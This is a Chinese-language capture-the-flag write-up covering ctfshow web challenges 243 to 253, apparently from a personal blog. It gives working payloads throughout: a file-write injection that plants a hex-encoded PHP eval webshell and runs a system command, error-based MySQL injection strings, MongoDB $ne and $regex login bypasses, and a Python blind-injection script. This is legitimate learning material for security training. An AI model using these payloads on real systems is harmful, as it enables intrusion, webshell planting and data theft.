所以最后总结一下

在/api/dump.php 处

依次post

```cobol
filename=.user.ini' LINES STARTING BY ";" TERMINATED BY 0x0a6175746f5f70726570656e645F66696c653d656173792e706e670a#


filename=easy.png' LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b305d293b3f3e#
```

然后去/dump 查看即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/aedcc81be6cdd94bde00dfa9adf958c4.png" alt="" style="max-height:285px; box-sizing:content-box;" />


出现报错证明成功

最后

```cobol
0=system('cat /flag.here');
```

## web244 报错注入无过滤

报错注入 最常见 就是 updatexml(1,0x7e,2)了

直接一把锁

```cobol
?id=1'and updatexml(1,0x7e,2)-- +


?id=1'and updatexml(1,concat(0x7e,(select database())),2)-- +
 
 
?id=1'and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),2)-- +


?id=1'and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='
ctfshow_flag')),2)-- +
 
 
?id=1'and updatexml(1,concat(0x7e,mid((select group_concat(flag)from ctfshow_flag),20,30)),2)-- +
```

## web245 报错过滤 updatexml

```undefined
 过滤updatexml
```

 [https://www.cnblogs.com/upstream-yu/p/15185494.html](https://www.cnblogs.com/upstream-yu/p/15185494.html) 

```cobol
1. floor + rand + group by
select * from user where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
select * from user where id=1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));
 
floor 被过滤 可使用 ceil(rand(0)*2)) 代替
 
2. ExtractValue
select * from user where id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
 
3. UpdateXml
select * from user where id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1));
 
4. Name_Const(>5.0.12)
select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;
 
5. Join
select * from(select * from mysql.user a join mysql.user b)c;
select * from(select * from mysql.user a join mysql.user b using(Host))c;
select * from(select * from mysql.user a join mysql.user b using(Host,User))c;
 
6. exp()//mysql5.7貌似不能用
select * from user where id=1 and Exp(~(select * from (select version())a));
 
7. geometrycollection()//mysql5.7貌似不能用
select * from user where id=1 and geometrycollection((select * from(select * from(select user())a)b));
 
8. multipoint()//mysql5.7貌似不能用
select * from user where id=1 and multipoint((select * from(select * from(select user())a)b));
 
9. polygon()//mysql5.7貌似不能用
select * from user where id=1 and polygon((select * from(select * from(select user())a)b));
 
10. multipolygon()//mysql5.7貌似不能用
select * from user where id=1 and multipolygon((select * from(select * from(select user())a)b));
 
11. linestring()//mysql5.7貌似不能用
select * from user where id=1 and linestring((select * from(select * from(select user())a)b));
 
12. multilinestring()//mysql5.7貌似不能用
select * from user where id=1 and multilinestring((select * from(select * from(select user())a)b));
```

这里使用一个就行了

```cobol
?id=1'and extractvalue(1,0x7e)-- +

?id=1'and extractvalue(1,concat(0x7e,(select database())))-- +
 
?id=1'and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))-- +




?id=1'and extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagsa')))-- +
 
flag1
 
 
 
?id=1'and extractvalue(1,concat(0x7e,(select group_concat(flag1) from ctfshow_flagsa)))-- +

?id=1'and extractvalue(1,concat(0x7e,mid((select group_concat(flag1) from ctfshow_flagsa),20,30)))-- +
```

## web246 过滤 extractvalue

```cobol
1' and (select 1 from (select count(*),concat((select (table_name) from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- +


1' and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flags"  limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- +
 
 
这里需要指定 数据库
 
 
 
?id=1' and (select 1 from (select count(*),concat((select flag2 from ctfshow_flags),floor(rand(0)*2))x from information_schema.tables group by x)a)-- +
```

## ⭐web247 floor被过滤

这里floor也被过滤 使用

```cobol
ceil(rand(0)*2))
```

代替即可

 [CTFshow-WEB入门-SQL注入(下)_//sql db.ctfshow_user.find({username:'$username',p_bfengj的博客-CSDN博客](https://blog.csdn.net/rfrder/article/details/113791067) 

```java
1' and (select 1 from (select count(*),concat((select (table_name) from information_schema.tables where table_schema=database() limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a)-- +


1' and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flagsa"  limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a)-- +
 
1' and (select 1 from (select count(*),concat((select `flag?` from ctfshow_flagsa),ceil(rand(0)*2))x from information_schema.tables group by x)a);--+
```

具体floor的原理 等等写吧

 [MYSQL floor 报错注入详解-CSDN博客](https://blog.csdn.net/weixin_45146120/article/details/100062786) 

这里就更好懂了 我看了以前我写的sqlilab 没这么好懂

## web248

我们看看语句是干嘛的

```php
  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";
```

很正常的查询 这里提示我们eval 应该是让我们getshell

UAF 不会跳过

 [CTFshow---WEB入门---（SQL注入）171-253 WP - bit's Blog - WEB&PWN](https://xl-bit.cn/93.html) 

## ⭐⭐web249  MONGODB --NOSQL注入

提示我们是nosql 这是啥???去查一下

这里我们先起码要去学会如何查询 所以 [MongoDB 查询文档 | 菜鸟教程](https://www.runoob.com/mongodb/mongodb-query.html) 

去看一下 10分钟差不多就ok 了 当然  最好在虚拟机中安装mongodb 然后亲手上去试一下

我感觉 mongodb就是一大堆已经集成函数的mysql



<img src="https://i-blog.csdnimg.cn/blog_migrate/3eccf4f10e4a30e2dc5d483bf23ffb2d.png" alt="" style="max-height:420px; box-sizing:content-box;" />


 [NoSQL注入小笔记 - Ruilin](http://rui0.cn/archives/609) 

 [冷门知识 — NoSQL注入知多少-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/97211) 

还有一个我写的文章

 [MONGODB 的基础 NOSQL注入基础-CSDN博客](https://blog.csdn.net/m0_64180167/article/details/134548592?spm=1001.2014.3001.5501) 

已经大致了解了nosql注入 开始做题吧

```swift
  $user = $memcache->get($id);
```

这里我们现在看就很简单了 其实就查询id

这里其实还有一个知识

```vbnet
Memcache::get
 
搜一下可以发现 就是接受数组，但是会返回第一个数据
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b6a6012f5cfc5149b521cadf2401789a.png" alt="" style="max-height:125px; box-sizing:content-box;" />


那么我们可以尝试通过数组传递参数

```cobol
/api/?id[]=flag
```

但是其实这里原理不知道 因为源代码没有给出来 不知道后端是为什么实现

## web250 永真注入

```php
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();
```

查询语句褒姒就是正常的

```cobol
  //无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
```

这里其实就是让我们登入成功即可

这里使用永真注入即可

```cobol
username[$ne]=1&password[$ne]=1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a91fa3f6601e7c487da25c528f51508c.png" alt="" style="max-height:643px; box-sizing:content-box;" />


说明这里的查询是

```cobol
{
    name => $username,
    password => $password
}
```

简单的传递

## web251



```php
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();
```



```cobol
  //无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
```

一样payload直接打

```cobol
username[$ne]=1&password[$ne]=1
```

## web252 username过滤ne 使用 regex

```php
  db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()
```

发现是直接拼接 在我写的文章中也存在

联合注入

```puppet
db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()
 
username=admin', $or: [ {}, {'a': 'a&password=' }]

就会变为

db.ctfshow_user.find({username:'admin', $or: [ {}, {'a': 'a',password:'' }]'}).pretty()
 
 
db.admin.find({username : 'admin', $or: [ {}, {'a': 'a',password: '' }]'})
```

发现失败了

这里那我们选择正则匹配吧

```cobol
username[$regex]=1&password[$ne]=1
```

```cobol
{"code":0,"msg":"\u767b\u9646\u6210\u529f","count":1,"data":[{"_id":{"$oid":"655d93184cc12302e618c38b"},"username":"admin1","password":"ctfshow666nnneeaaabbbcc"}]}
```

回显了 admin的值 我们不需要 我们排除即可

```cobol
username[$regex]=^a[dmin].*&password[$ne]=1
 
这里正则就是不匹配admin开头的所有内容
```

## web253  nosql盲注

盲注

payload为

```cobol
username[$regex]=flag&password[$regex]=ctfshow{
```

回显

```clojure
\u767b\u9646\u6210\u529f
```

说明存在

写个脚本

```cobol
import requests
 
url="http://f9ad09f9-c12b-4f91-b38e-e587c65acd74.challenge.ctf.show/api/"
 
flag=""
 
for i in range(1,100):
    for j in "{-abcdefghijklmnopqrstuvwxyz0123456789}":
        payload="^{}.*$".format(flag+j)
        # print(payload)
        data={
            'username[$regex]':'flag',
            'password[$regex]':payload
        }
        r=requests.post(url=url,data=data)
        if r"\u767b\u9646\u6210\u529f" in r.text:
            flag+=j
            print(flag)
            if j=="}":
                exit()
            break
```

## 结语

最后ctfshow的SQL注入就结束了 但是其实学到了确实很多东西 tamper 注入过滤 构造数字等

以后可能还会再花几天重新做一遍